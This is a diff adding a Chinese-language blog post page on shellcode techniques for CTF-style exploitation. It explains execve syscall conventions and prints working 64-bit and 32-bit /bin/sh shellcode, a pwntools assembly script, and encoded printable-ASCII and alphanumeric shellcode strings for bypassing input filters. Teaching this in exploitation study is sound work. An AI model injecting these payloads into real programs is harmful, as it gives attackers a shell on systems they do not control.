@@ -1,0 +1,324 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="shellcode的艺术​		shellcode的花样与难处也就是在于白名单绕过，即各种对注入shellcode的限制 前言linux中，存在着一系列的系统调用，这些系统调用都通过syscall指令来触发，并且通过rax寄存器作为系统调用号来区分不同的系统调用，可以通过查看linux源码目录下的arch&#x2F;x86&#x2F;entry&#x2F;syscall_64.tbl获得对应的系统调">
+<meta property="og:type" content="article">
+<meta property="og:title" content="shellcode的艺术">
+<meta property="og:url" content="http://example.com/2023/10/20/shellcode%E7%9A%84%E8%89%BA%E6%9C%AF/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="shellcode的艺术​		shellcode的花样与难处也就是在于白名单绕过，即各种对注入shellcode的限制 前言linux中，存在着一系列的系统调用，这些系统调用都通过syscall指令来触发，并且通过rax寄存器作为系统调用号来区分不同的系统调用，可以通过查看linux源码目录下的arch&#x2F;x86&#x2F;entry&#x2F;syscall_64.tbl获得对应的系统调">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2023-10-19T16:00:00.000Z">
+<meta property="article:modified_time" content="2023-11-23T12:57:06.365Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>shellcode的艺术</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2023/10/16/PWN%E4%B8%AD%E7%9A%84%E9%9A%8F%E6%9C%BA%E6%95%B0%E6%BC%8F%E6%B4%9E/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/10/20/shellcode%E7%9A%84%E8%89%BA%E6%9C%AF/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/10/20/shellcode%E7%9A%84%E8%89%BA%E6%9C%AF/&text=shellcode的艺术"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/10/20/shellcode%E7%9A%84%E8%89%BA%E6%9C%AF/&title=shellcode的艺术"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/10/20/shellcode%E7%9A%84%E8%89%BA%E6%9C%AF/&is_video=false&description=shellcode的艺术"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=shellcode的艺术&body=Check out this article: http://example.com/2023/10/20/shellcode%E7%9A%84%E8%89%BA%E6%9C%AF/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/10/20/shellcode%E7%9A%84%E8%89%BA%E6%9C%AF/&title=shellcode的艺术"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/10/20/shellcode%E7%9A%84%E8%89%BA%E6%9C%AF/&title=shellcode的艺术"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/10/20/shellcode%E7%9A%84%E8%89%BA%E6%9C%AF/&title=shellcode的艺术"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/10/20/shellcode%E7%9A%84%E8%89%BA%E6%9C%AF/&title=shellcode的艺术"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/10/20/shellcode%E7%9A%84%E8%89%BA%E6%9C%AF/&name=shellcode的艺术&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/10/20/shellcode%E7%9A%84%E8%89%BA%E6%9C%AF/&t=shellcode的艺术"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#shellcode%E7%9A%84%E8%89%BA%E6%9C%AF"><span class="toc-number">1.</span> <span class="toc-text">shellcode的艺术</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%8F%AF%E6%89%93%E5%8D%B0ascii"><span class="toc-number">1.2.</span> <span class="toc-text">1.可打印ascii</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E7%BA%AF%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8Dshellcode"><span class="toc-number">1.3.</span> <span class="toc-text">2.纯数字字母shellcode</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        shellcode的艺术
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">John Doe</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-10-19T16:00:00.000Z" class="dt-published" itemprop="datePublished">2023-10-20</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="shellcode的艺术"><a href="#shellcode的艺术" class="headerlink" title="shellcode的艺术"></a>shellcode的艺术</h2><p>​		shellcode的花样与难处也就是在于白名单绕过，即各种对注入shellcode的限制</p>
+<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>linux中，存在着一系列的系统调用，这些系统调用都通过syscall指令来触发，并且通过rax寄存器作为系统调用号来区分不同的系统调用，可以通过查看linux源码目录下的arch&#x2F;x86&#x2F;entry&#x2F;syscall_64.tbl获得对应的系统调用号。比如，execve对应的的系统调用号为59。接着，即是通过rdi和rsi两个寄存器传入参数。其中，rdi是指向运行程序的路径的指针，rsi为一个指向0的指针，rdx为0。即：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rax = 59</span><br><span class="line">rdi = [&#x27;/bin/sh&#x27;]</span><br><span class="line">rsi = [0]</span><br><span class="line">rdx = 0</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
+
+<p>64位手写shellcode:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor rdx,rdx;</span></span><br><span class="line"><span class="string">push rdx;</span></span><br><span class="line"><span class="string">mov rsi,rsp;</span></span><br><span class="line"><span class="string">mov rax,0x68732f2f6e69622f;</span></span><br><span class="line"><span class="string">push rax;</span></span><br><span class="line"><span class="string">mov rdi,rsp;</span></span><br><span class="line"><span class="string">mov rax,59;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode = asm(shellcode)</span><br></pre></td></tr></table></figure>
+
+<p>32位手写shellcode:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">xor ecx,ecx</span><br><span class="line">xor edx,edx</span><br><span class="line">xor ebx,ebx </span><br><span class="line">push ebx</span><br><span class="line">push 0x68732f2f</span><br><span class="line">push 0x6e69622f</span><br><span class="line">mov ebx,esp</span><br><span class="line">xor eax,eax</span><br><span class="line">push 11</span><br><span class="line">pop eax</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="1-可打印ascii"><a href="#1-可打印ascii" class="headerlink" title="1.可打印ascii"></a>1.可打印ascii</h3><p>这一种的限制一般是要求shellcode为可打印字符，包括字母、数字、符号。<br>有一款很不错的工具：<a target="_blank" rel="noopener" href="https://github.com/rcx/shellcode_encoder">shellcode_encoder</a><br>使用这一工具首先需要安装z3-solver：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pip install z3-solver</span><br></pre></td></tr></table></figure>
+
+<p>开始生成可打印shellcode前，我们需要先将原来的shellcode输出到一个文件中，这里我们用python来执行：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor rdx,rdx;</span></span><br><span class="line"><span class="string">push rdx;</span></span><br><span class="line"><span class="string">mov rsi,rsp;</span></span><br><span class="line"><span class="string">mov rax,0x68732f2f6e69622f;</span></span><br><span class="line"><span class="string">push rax;</span></span><br><span class="line"><span class="string">mov rdi,rsp;</span></span><br><span class="line"><span class="string">mov rax,59;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;shellcode&#x27;</span>,<span class="string">&#x27;wb+&#x27;</span>)</span><br><span class="line">f.write(shellcode)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
+
+<p>然后，将生成的shellcode文件放到shellcode_encoder目录下，运行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python main.py shellcode rax+29</span><br></pre></td></tr></table></figure>
+
+<p>其中，shellcode是我们生成的shellcode文件，然后因为漏洞程序是通过call rax调用shellcode的，以及shellcode_encoder生成shellcode时的偏移位置，所以这里用了rax+29。生成的shellcode:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Original length: 30</span><br><span class="line">Encoded length:  476</span><br><span class="line">Preamble length: 29</span><br><span class="line">Total length:    505</span><br><span class="line"></span><br><span class="line">PPTAYAXVI31VXXXf-C_f-@hf-`8PZTAYAXVI31VXPP[_Hc4:14:SX- (mz-i Wx5?&lt;??P^14:WX-|w_?-@U@C-@3`&#125;P_Hc4:14:SX-IL+N-@x6x5?41&#125;P^14:WX-|w_?-@U@C-@3`&#125;P_Hc4:14:SX-Txl(-H0| 5V__&gt;P^14:WX-|w_?-@U@C-@3`&#125;P_Hc4:14:SX-Gz#&#x27;-~  @5?_?_P^14:WX-|w_?-@U@C-@3`&#125;P_Hc4:14:SX-e3&#x27;R-T)@~5O ^?P^14:WX-|w_?-@U@C-@3`&#125;P_Hc4:14:SX-&amp;Pu8-( @@57O?oP^14:WX-|w_?-@U@C-@3`&#125;P_SX-:AXH-#?Hx5;~_?P_Hc4:14:SX- $80- ,  5?M7?P^14:WX-|w_?-@U@C-@3`&#125;P_SX-@dG1- dyo5&lt;6?_P^SX-zphB-``(~5&gt;/o?P_AAAAo&#123;5mTM=K8_?* *v k1jXk_DC(%r:ou&#125;&#125;n;oopM]alYoM0&quot;+/O%Y2P9@&quot;USR2|O?+</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="2-纯数字字母shellcode"><a href="#2-纯数字字母shellcode" class="headerlink" title="2.纯数字字母shellcode"></a>2.纯数字字母shellcode</h3><p>具体见引文：<a target="_blank" rel="noopener" href="https://hama.hatenadiary.jp/entry/2017/04/04/190129">https://hama.hatenadiary.jp/entry/2017/04/04/190129</a><br>shellcode:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PPYh00AAX1A0hA004X1A4hA00AX1A8QX44Pj0X40PZPjAX4znoNDnRYZnCXA</span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#shellcode%E7%9A%84%E8%89%BA%E6%9C%AF"><span class="toc-number">1.</span> <span class="toc-text">shellcode的艺术</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%8F%AF%E6%89%93%E5%8D%B0ascii"><span class="toc-number">1.2.</span> <span class="toc-text">1.可打印ascii</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E7%BA%AF%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8Dshellcode"><span class="toc-number">1.3.</span> <span class="toc-text">2.纯数字字母shellcode</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/10/20/shellcode%E7%9A%84%E8%89%BA%E6%9C%AF/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/10/20/shellcode%E7%9A%84%E8%89%BA%E6%9C%AF/&text=shellcode的艺术"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/10/20/shellcode%E7%9A%84%E8%89%BA%E6%9C%AF/&title=shellcode的艺术"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/10/20/shellcode%E7%9A%84%E8%89%BA%E6%9C%AF/&is_video=false&description=shellcode的艺术"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=shellcode的艺术&body=Check out this article: http://example.com/2023/10/20/shellcode%E7%9A%84%E8%89%BA%E6%9C%AF/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/10/20/shellcode%E7%9A%84%E8%89%BA%E6%9C%AF/&title=shellcode的艺术"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/10/20/shellcode%E7%9A%84%E8%89%BA%E6%9C%AF/&title=shellcode的艺术"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/10/20/shellcode%E7%9A%84%E8%89%BA%E6%9C%AF/&title=shellcode的艺术"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/10/20/shellcode%E7%9A%84%E8%89%BA%E6%9C%AF/&title=shellcode的艺术"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/10/20/shellcode%E7%9A%84%E8%89%BA%E6%9C%AF/&name=shellcode的艺术&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/10/20/shellcode%E7%9A%84%E8%89%BA%E6%9C%AF/&t=shellcode的艺术"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2023
+    John Doe
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
